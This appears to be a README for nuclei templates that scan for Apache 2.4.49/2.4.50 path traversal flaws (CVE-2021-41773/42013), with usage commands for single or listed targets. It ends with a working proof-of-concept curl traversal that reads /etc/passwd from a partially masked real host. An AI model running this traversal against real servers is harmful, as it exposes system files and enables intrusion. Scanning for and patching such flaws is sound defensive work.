# Scan FOR APACHE versions "ZERO-DAY" 

```Apache Version 2.4.49 and 2.4.50 ``` 


```(CVE-2021-41773) and (CVE-2021-42013)```


## How to use : 

You Will need nuclei ! 

https://github.com/projectdiscovery/nuclei


Check local nuclei install and verify template 

```nuclei  -t apache-vulnerable-versions.yaml -vv ```

and 

```nuclei -t apache-path-traversal-rce-v2.yaml -vv ```

You should see 

```[apache-vulnerable-versions] Vulnerable Apache Versions (2.4.49-2.4.50) (@psibot) [high] ```

and 

```[apache-path-traversal-passwd] Apache Path Traversal - /etc/passwd Exposure (@psibot) [critical]```

To scan target : 

```  nuclei --silent  -t apache-vulnerable-versions.yaml -u https://*.*.*.*:port ``` 

To scan targets in a file : 

```  nuclei --silent  -t apache-vulnerable-versions.yaml -l hosts.txt``` 


## Info about Nuclei templates 

```apache-vulnerable-versions.yaml``` - Detects version of Apache and will output HIGH if vulnerible. 

![apache-vulnerable-versions.yaml](https://imgur.com/WTDHjtO.png)


```apache-path-traversal-rce-v2.yaml``` - Will run a exploit and show the path vulnerible. Will output CRITICAL if  vulnerible.

![apache-path-traversal-rce-v2.yaml](https://imgur.com/Nrg7vER.png)

POC : 

```curl -s  -k  https://135.*.120.*:8443/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ```

![POC](https://imgur.com/ijInybr.png)